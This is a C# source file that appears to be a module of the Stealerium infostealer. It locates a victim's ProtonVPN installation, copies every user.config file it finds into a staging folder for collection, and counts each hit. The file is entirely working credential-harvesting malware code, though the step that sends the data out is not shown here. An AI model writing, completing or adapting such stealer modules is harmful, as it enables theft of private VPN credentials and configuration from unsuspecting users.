using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN
{
    internal sealed class ProtonVpn
    {
        // Save ProtonVPN configuration files to the specified path
        public static void Save(string savePath)
        {
            // Define the ProtonVPN directory path
            var protonVpnPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");

            // Stop if the ProtonVPN directory does not exist
            if (!Directory.Exists(protonVpnPath))
                return;

            try
            {
                // Iterate over all subdirectories in the ProtonVPN folder
                foreach (var directory in Directory.GetDirectories(protonVpnPath))
                {
                    // Iterate over each version directory inside the ProtonVPN executable directory
                    foreach (var versionDirectory in Directory.GetDirectories(directory))
                    {
                        var userConfigPath = Path.Combine(versionDirectory, "user.config");
                        if (!File.Exists(userConfigPath)) continue;

                        // Define the destination directory to copy the configuration
                        var destinationDir = Path.Combine(savePath, new DirectoryInfo(versionDirectory).Name);

                        if (!Directory.Exists(destinationDir))
                        {
                            Counter.Vpn++;
                            Directory.CreateDirectory(destinationDir);

                            // Copy the user.config file to the destination directory
                            File.Copy(userConfigPath, Path.Combine(destinationDir, "user.config"));
                        }
                    }
                }
            }
            catch (Exception error)
            {
                // Log or handle the exception if necessary
                Logging.Log("ProtonVPN >> Error saving ProtonVPN data:\n" + error);
            }
        }
    }
}
